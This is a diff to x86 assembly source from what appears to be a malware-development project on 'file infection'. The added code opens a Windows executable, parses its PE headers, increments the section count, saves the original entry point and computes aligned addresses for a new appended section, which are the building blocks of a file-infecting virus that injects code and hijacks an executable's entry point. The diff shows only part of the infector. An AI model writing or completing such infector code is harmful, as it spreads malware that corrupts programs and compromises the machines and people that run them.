@@ -39,7 +39,13 @@ start_code:
 	mov [ebp - 80], eax		;File mapview address
 	mov [ebp - 84], eax		;New number of sections
 	mov [ebp - 88], eax		;SizeofOptionalHeader
-	
+	mov [ebp - 92], eax		;Old AOEP
+	mov [ebp - 96], eax		;SectionAlignment
+	mov [ebp - 100], eax	;FileAlignment
+	mov [ebp - 104], eax	;New Sections Virtual Address
+	mov [ebp - 108], eax	;New Sections Raw Address
+
+
 
 	lea eax, [ebx + offset wszKernel32]
 	push eax
@@ -208,8 +214,8 @@ start_code:
 	push eax
 	mov eax, [ebp - 32]		;VA CreateFileA
 	call eax
-	test eax, eax
-	jz Exit
+	cmp eax, -1
+	je Exit
 	mov [ebp - 68], eax		;File Handle
 
 ;GetFileSize
@@ -255,29 +261,52 @@ start_code:
 	inc ax
 	mov word ptr[ebp - 84], ax		;New number of sections
 
-;Fix new number of sections
-;SetFilePointer
-	push 0					;FILE_BEGIN
-	push 0
-	mov eax, esi
-	sub eax, [ebp - 80]		;offset from begin file
+;Get size of optional header
+	add esi, 0eh			;pointer to SizeOfOptionalHeader
+	mov ax, word ptr[esi]	;SizeOfOptionalHeader
+	mov word ptr[ebp - 88], ax	
+
+;Get AOEP
+	add esi, 4				;pointer to Optional header
+	add esi, 10h			;pointer to AddressOfEntryPoint
+	mov eax, [esi]			;AddressOfEntryPoint
+	mov dwOldAOEP, eax
+ 
+ ;Get Alignment
+	add esi, 10h			;pointer to SectionAlignment
+	mov eax, [esi]	
+	mov [ebp - 96], eax
+
+	add esi, 4
+	mov eax, [esi]			;pointer to FileAlignment
+	mov [ebp - 100], eax
+
+;Get Pointer to Section Header
+	mov esi, [ebp - 80]		;File Handle
+	add esi, [esi + 3ch]	;NtHeader
+	add esi, 18h			;OptionalHeader
+	add esi, [ebp - 88]		;SectionHeader
+
+;Get Pointer to Final Section
+	mov ax, word ptr[ebp - 84]	;Number of sections
+	sub ax, 2				;> 1 sections
+	mov dx, 28h				;Size of 1 sections header
+	mul dx	
+	add esi, eax			;Pointer to final section header
+
+	mov eax, [esi + 0ch]
+	add eax, [esi + 8h]
+	push [ebp - 96]
 	push eax
-	push [ebp - 68]			;File handle
-	mov eax, [ebp - 52]		;SetFilePointer
-	call eax
+	call CalcAlign
+	mov [ebp - 104], eax	;calc New Sections Virtual Address
 
-;Write new number sections
-	push 0
-	push 0
-	push 2					;Write 2 bytes
-	lea eax, [ebp - 84]		;address of new number of sections
+	mov eax, [esi + 014h]
+	add eax, [esi + 010h]
+	push [ebp - 100]
 	push eax
-	push [ebp - 68]			;File handle
-	mov eax, [ebp - 60]		;VA WriteFile
-	call eax
-
-;Get size of opt
-
+	call CalcAlign
+	mov [ebp - 108], eax	;calc New Sections Raw Address
 
 
 
@@ -496,6 +525,28 @@ EndToLower:
 	pop ebp
 	ret
 ToLower endp
+
+CalcAlign proc	;arg1: value	;arg2: align
+	push ebp
+	mov ebp, esp
+
+	mov edx, 0
+	mov eax, [ebp + 8]
+	mov ecx, [ebp + 12]
+	div ecx
+
+	cmp edx, 0
+	je _not_add
+	add eax, 1
+_not_add:
+	mov edx, [ebp + 12]
+	mul edx
+
+	mov esp, ebp
+	pop ebp
+	ret
+CalcAlign endp
+
 	sFilePath db "C:\Users\levuong\Documents\GitHub\MalDev\FileInfection\Debug\ShellCode.exe", 0
 	wszKernel32 dw 'c',':','\','w','i','n','d','o','w','s','\','s','y','s','t','e','m','3','2','\','k','e','r','n','e','l','3','2','.', 'd','l','l', 0
 	sUser32 db "User32.dll", 0
@@ -514,5 +565,6 @@ ToLower endp
 	sWriteFile db "WriteFile", 0
 	sCloseHandle db "CloseHandle", 0
 
+	dwOldAOEP dd 0
 end_label:
 end _main
